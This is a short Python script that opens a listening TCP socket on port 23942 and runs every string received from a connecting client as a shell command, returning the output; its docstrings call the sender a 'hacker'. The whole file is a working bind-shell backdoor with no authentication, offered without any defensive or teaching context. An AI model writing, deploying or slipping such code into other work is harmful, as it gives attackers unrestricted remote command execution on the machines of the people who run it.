import subprocess
import socket
import threading


class Command_Control:
    def __init__(self):
        self.clients = []
        self.HOST = socket.gethostbyname(socket.gethostname())
        self.PORT = 23942
        self.connection()

    def connection(self):
        """Make the connection
        """
        socket_servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_servidor.bind((self.HOST, self.PORT))
        socket_servidor.listen(10)

        while True:
            socket_client, addr = socket_servidor.accept()
            print("Connected with:", str(addr))

            self.clients.append(socket_client)
            threading.Thread(target=self.recv_command, args=[socket_client]).start()

    def delete_client(self, client):
        """Remove user active

        Args:
            client (object socket): socket_client
        """
        self.clients.remove(client)

    def run_command(self, command):
        """Run command received

        Args:
            command (string): command received from hacker
        """
        for user in self.clients:
            try:
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                output, error = process.communicate()
                output = output.decode("latin1")
                if not output:
                    user.send(" ".encode())
                else:
                    user.send(f"{output}".encode("latin1"))
            except:
                self.delete_client(user)


    def recv_command(self, client):
        """Receive commands from hacker

        Args:
            client (object socket): socket_client
        """
        try:
            while True:
                command = client.recv(4028).decode("utf-8")
                self.run_command(command)
        except:
            pass


Command_Control()